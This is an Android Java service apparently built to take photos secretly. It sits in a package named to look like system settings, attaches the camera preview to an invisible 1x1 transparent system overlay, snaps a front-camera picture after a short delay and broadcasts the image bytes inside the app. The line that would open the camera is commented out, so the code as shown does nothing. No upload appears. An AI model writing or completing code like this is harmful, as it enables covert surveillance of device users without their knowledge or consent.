package com.android.data.settings.Service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import java.io.IOException;
import java.util.List;


public class CameraService extends Service {
    private Camera mCamera;
    private boolean safeToClick = false;
    private int camRotation = 0;

    private static final String TAG = "CameraService";

    public static final String INTENT_SELECTED_CAMERA = "SELECTED_CAMERA_FOR_SNAP";
    public static final String INTENT_SELECTED_FUNCTION = "SELECTED_OPERATION";
    public static final String INTENT_CAMERA_ROTATION = "CAMERA_ROTATION";

    public static final int FUNCTION_TAKE_SNAP = 1;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(intent == null) {
            throw new IllegalStateException("Must start the service with intent");
        }

        switch (intent.getIntExtra(INTENT_SELECTED_FUNCTION, -1)) {
            case FUNCTION_TAKE_SNAP:
                camRotation = intent.getIntExtra(INTENT_CAMERA_ROTATION, 0);
                prepareCamera(intent.getIntExtra(INTENT_SELECTED_CAMERA, Camera.CameraInfo.CAMERA_FACING_FRONT));
                break;

            default:
                throw new UnsupportedOperationException("Cannot start service with illegal commands");
        }

        return START_NOT_STICKY;
    }

    public static void takeSnap(Context context, int cameraId, int function, int camRotation) {
        Intent intent = new Intent(context, CameraService.class);
        intent.putExtra(INTENT_SELECTED_CAMERA, cameraId);
        intent.putExtra(INTENT_SELECTED_FUNCTION, function);
        intent.putExtra(INTENT_CAMERA_ROTATION, camRotation);
        context.startService(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    private void prepareCamera(int cameraId) {
        //mCamera = CameraUtility.getCameraInstance(cameraId);
        if(mCamera != null) {
            SurfaceView surfaceView = new SurfaceView(CameraService.this);
            SurfaceHolder surfaceHolder = surfaceView.getHolder();

            surfaceView.setZOrderOnTop(true);
            surfaceHolder.setFormat(PixelFormat.TRANSPARENT);

            surfaceHolder.addCallback(surCallback);

            WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1,
                    WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT);

            windowManager.addView(surfaceView, params);
        }
    }

    SurfaceHolder.Callback surCallback = new SurfaceHolder.Callback() {
        @Override
        public void surfaceCreated(SurfaceHolder sHolder) {
            if(mCamera != null) {
                Camera.Parameters params = mCamera.getParameters();
                params.setRotation(camRotation);
                mCamera.setParameters(params);
                Camera.Parameters p = mCamera.getParameters();

                List<Camera.Size> listSize;

                listSize = p.getSupportedPreviewSizes();
                Camera.Size mPreviewSize = listSize.get(2);
                p.setPreviewSize(mPreviewSize.width, mPreviewSize.height);

                listSize = p.getSupportedPictureSizes();
                final Camera.Size mPictureSize = listSize.get(0);
                p.setPictureSize(mPictureSize.width, mPictureSize.height);
                mCamera.setParameters(p);

                try {
                    mCamera.setPreviewDisplay(sHolder);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                mCamera.startPreview();

                safeToClick = true;

                if(safeToClick) {
                    new Handler().postDelayed(() -> {
                        try {
                            mCamera.takePicture(null, null, mPictureCallback);
                            safeToClick = false;
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }, 500);
                }
            } else {
                Log.d(TAG, "Camera is nul");
            }
        }

        @Override
        public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i1, int i2) {

        }

        @Override
        public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
            mCamera.release();
        }
    };

    private Camera.PictureCallback mPictureCallback = (byte[] data, Camera camera) -> {
        Intent intent = new Intent("CamServiceUpdates");
        intent.putExtra("ImageBytes", data);
        camera.release();
        LocalBroadcastManager.getInstance(CameraService.this).sendBroadcast(intent);
        stopSelf();
    };
}
